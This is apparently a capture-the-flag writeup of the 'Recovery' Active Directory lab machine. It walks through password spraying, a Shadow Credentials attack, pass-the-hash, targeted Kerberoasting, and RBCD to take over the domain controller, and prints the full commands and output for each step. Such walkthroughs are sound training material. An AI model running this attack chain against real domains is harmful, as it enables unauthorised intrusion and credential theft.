---
title: Recovery - Ronin66 Machine
published: 2026-09-10
description: Recovery writeup
tags: [AD, Password Spraying, Shadow Credentials, Kerberoasting, RBCD]
category: Ronin66
image: "images/cover.png"
draft: false
------------

## Summary

Recovery is a Windows domain controller for the `recovery.local` domain. Initial enumeration revealed that SMB accepted null authentication, allowing the domain user list to be enumerated. One account had a password exposed in its description field, which was successfully sprayed against the other users and resulted in valid credentials for `j.ortega`.

With access as `j.ortega`, BloodHound identified an `AddKeyCredentialLink` relationship over `s.connery`. This permission was abused to perform a Shadow Credentials attack, obtaining the NT hash of `s.connery` and gaining a WinRM session.

From the compromised host, a custom binary in `C:\Utils` was downloaded and analyzed with `strings`, revealing another cleartext credential. The recovered password belonged to `s.johansson`. BloodHound then showed that `s.johansson` had `WriteSPN` over `w.dafoe`, allowing a targeted Kerberoasting attack. The resulting TGS hash was cracked offline, recovering `w.dafoe`'s password.

Finally, BloodHound showed that `w.dafoe` had `GenericAll` over the domain controller. This was abused to configure Resource-Based Constrained Delegation (RBCD), impersonate `Administrator`, and obtain full control of the domain controller.

## Recon

### Initial Enumeration

A full TCP scan with service detection was performed to identify the exposed services:

```shell
nmap -sSV -p- 172.16.18.19 --min-rate 5000

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: recovery.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
3268/tcp  open  ldap
3269/tcp  open  ssl/ldap
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The exposed Kerberos, LDAP, SMB, and RPC services indicated that the target was a domain controller. The LDAP banner identified the domain as `recovery.local`, while the service information identified the host as `DC01`.

### SMB Enumeration

Since SMB was exposed on port 445, a null session was tested. The server accepted anonymous authentication and allowed the domain user list to be enumerated:

```shell
nxc smb 172.16.18.19 -u '' -p '' --users

SMB   172.16.18.19   445   DC01   [+] recovery.local\:
SMB   172.16.18.19   445   DC01   -Username-      -Last PW Set-       -BadPW- -Description-
SMB   172.16.18.19   445   DC01   Guest           <never>             0
SMB   172.16.18.19   445   DC01   s.connery       2025-10-14 12:37:26 0
SMB   172.16.18.19   445   DC01   m.gibson        2025-10-14 12:38:51 0
SMB   172.16.18.19   445   DC01   j.statham       2025-10-14 12:40:40 0   ChangeMe2025!
SMB   172.16.18.19   445   DC01   s.johansson     2025-10-17 13:46:49 0
SMB   172.16.18.19   445   DC01   j.ortega        2025-10-14 13:17:02 0
SMB   172.16.18.19   445   DC01   w.dafoe         2025-10-17 13:44:57 0
SMB   172.16.18.19   445   DC01   [*] Enumerated 7 local users: RECOVERY
```

The description field for `j.statham` contained the value `ChangeMe2025!`, which appeared to be a password. Testing it against the account itself showed that it was not valid for `j.statham`:

```shell
nxc smb 172.16.18.19 -u 'j.statham' -p 'ChangeMe2025!'

SMB   172.16.18.19   445   DC01   [-] recovery.local\j.statham:ChangeMe2025! STATUS_LOGON_FAILURE
```

Since the password was exposed in the domain user enumeration output but did not belong to `j.statham`, it was sprayed against the other enumerated accounts:

```shell
nxc smb 172.16.18.19 -u users.txt -p 'ChangeMe2025!'

SMB   172.16.18.19   445   DC01   [-] recovery.local\s.connery:ChangeMe2025! STATUS_LOGON_FAILURE
SMB   172.16.18.19   445   DC01   [-] recovery.local\m.gibson:ChangeMe2025! STATUS_LOGON_FAILURE
SMB   172.16.18.19   445   DC01   [-] recovery.local\j.statham:ChangeMe2025! STATUS_LOGON_FAILURE
SMB   172.16.18.19   445   DC01   [-] recovery.local\s.johansson:ChangeMe2025! STATUS_LOGON_FAILURE
SMB   172.16.18.19   445   DC01   [+] recovery.local\j.ortega:ChangeMe2025!
```

The password was valid for `j.ortega`:

```text
j.ortega : ChangeMe2025!
```

## Shell as s.connery

### BloodHound Analysis

With valid domain credentials, BloodHound data was collected to identify additional attack paths:

```shell
bloodyAD --host 172.16.18.19 -d recovery.local -u 'j.ortega' -p 'ChangeMe2025!' get bloodhound
```

The resulting BloodHound data showed that `j.ortega` had the `AddKeyCredentialLink` permission over `s.connery`.

![j.ortega has AddKeyCredentialLink over s.connery](images/Pasted%20image%2020260909153032.png)

`AddKeyCredentialLink` allows a new Key Credential to be associated with the target account. This can be abused through a Shadow Credentials attack to authenticate as the target account using PKINIT.

### Shadow Credentials Attack

Before performing the attack, the local system clock was synchronized with the domain controller to avoid Kerberos authentication failures caused by clock skew. `bloodyAD` was then used to add a Shadow Credential to `s.connery`:

```shell
ntpdate 172.16.18.19
bloodyAD --host 172.16.18.19 -d recovery.local -u 'j.ortega' -p 'ChangeMe2025!' add shadowCredentials s.connery

[+] KeyCredential generated with following sha256 of RSA key: 31a076ce8fdb33064fe108ed74395c2379a1a2ad9e2d29205cbafbe0e67afdd7
[+] TGT stored in ccache file s.connery_zx.ccache

NT: 406345455039820bb7e5fad7cf82c556
```

The attack returned the NT hash associated with `s.connery`. The hash was then used for pass-the-hash authentication over WinRM:

```shell
evil-winrm -i 172.16.18.19 -u 's.connery' -H '406345455039820bb7e5fad7cf82c556'

*Evil-WinRM* PS C:\Users> cat Public/user.flg
e34<SNIP>a09
```

This provided an authenticated shell as `s.connery`.

## Shell as s.johansson

### Cleartext Credential in mount.exe

While enumerating the compromised host, a custom executable was found in `C:\Utils`:

```text
*Evil-WinRM* PS C:\Utils> ls

    Directory: C:\Utils

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/15/2025   6:09 PM         113774 mount.exe
```

The binary was downloaded for local analysis. Running `strings` against it revealed a hardcoded credential:

```shell
strings mount.exe

user: ******@recovery.local
password: R0ckth!spass678
```

The recovered password was then sprayed against the previously enumerated domain accounts to determine which account it belonged to:

```shell
nxc smb 172.16.18.19 -u users.txt -p 'R0ckth!spass678'

<SNIP>

SMB   172.16.18.19   445   DC01   [-] recovery.local\s.connery:R0ckth!spass678 STATUS_LOGON_FAILURE
SMB   172.16.18.19   445   DC01   [-] recovery.local\m.gibson:R0ckth!spass678 STATUS_LOGON_FAILURE
SMB   172.16.18.19   445   DC01   [-] recovery.local\j.statham:R0ckth!spass678 STATUS_LOGON_FAILURE
SMB   172.16.18.19   445   DC01   [+] recovery.local\s.johansson:R0ckth!spass678
```

The password was valid for `s.johansson`:

```text
s.johansson : R0ckth!spass678
```

### Targeted Kerberoast against w.dafoe

Using the `s.johansson` credentials, BloodHound was reviewed for additional privileges and relationships. It showed that `s.johansson` had `WriteSPN` over `w.dafoe`.

![s.johansson has WriteSPN over w.dafoe](images/Pasted%20image%2020260909161847.png)

This permission allowed a targeted Kerberoasting attack. The attack temporarily assigned an SPN to `w.dafoe`, requested a Kerberos service ticket for the account, and removed the SPN after the ticket was obtained:

```shell
python3 targetedKerberoast.py -v -d 'recovery.local' -u 's.johansson' -p 'R0ckth!spass678'

[*] Starting kerberoast attacks
[VERBOSE] SPN added successfully for (w.dafoe)
[+] Printing hash for (w.dafoe)
$krb5tgs$23$*w.dafoe$RECOVERY.LOCAL$recovery.local/w.dafoe*$<SNIP>999851762ae5479c202a4e124c25f5c464b8d31a20c37dd051798ea60c111383556f765
[VERBOSE] SPN removed successfully for (w.dafoe)
```

The resulting TGS hash was saved and cracked offline using John the Ripper:

```shell
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
mdmdancer3!      (?)
1g 0:00:00:01 DONE
```

The password for `w.dafoe` was recovered:

```text
w.dafoe : mdmdancer3!
```

## Domain Compromise

### RBCD to Domain Compromise

With valid credentials for `w.dafoe`, BloodHound showed that the account had `GenericAll` over the domain controller.

![w.dafoe has GenericAll on the DC](images/Pasted%20image%2020260909162317.png)

This level of control allowed Resource-Based Constrained Delegation (RBCD) to be configured against `DC01$`.

First, a new computer account was created to act as the delegation source:

```shell
impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 172.16.18.19 -domain-netbios recovery.local 'recovery.local/w.dafoe:mdmdancer3!'
[*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.
```

The newly created computer account was then granted delegation rights over the domain controller:

```shell
impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' -action 'write' 'recovery.local/w.dafoe:mdmdancer3!'
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on DC01$ via S4U2Proxy
```

With the delegation relationship in place, a service ticket for `cifs/DC01.recovery.local` was requested while impersonating `Administrator`:

```shell
impacket-getST -spn 'cifs/DC01.recovery.local' -impersonate 'Administrator' -dc-ip 172.16.18.19 'recovery.local/ATTACKERSYSTEM$:Summer2018!'
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.recovery.local@RECOVERY.LOCAL.ccache
```

The resulting Kerberos ticket was then used with `wmiexec`. The DC FQDN was first added to `/etc/hosts`, and the generated ccache file was exported through `KRB5CCNAME`:

```shell
echo '172.16.18.19 DC01.recovery.local DC01' >> /etc/hosts

export KRB5CCNAME=Administrator@cifs_DC01.recovery.local@RECOVERY.LOCAL.ccache

impacket-wmiexec Administrator@DC01.recovery.local -k -no-pass
[*] SMBv3.0 dialect used
C:\>whoami
recovery\administrator
```

The resulting session was authenticated as `recovery\administrator`, providing administrative control of the domain controller. The final flag was then retrieved from the Administrator desktop:

```text
C:\Users\Administrator\Desktop>type root.flg
ed2<SNIP>4cd
```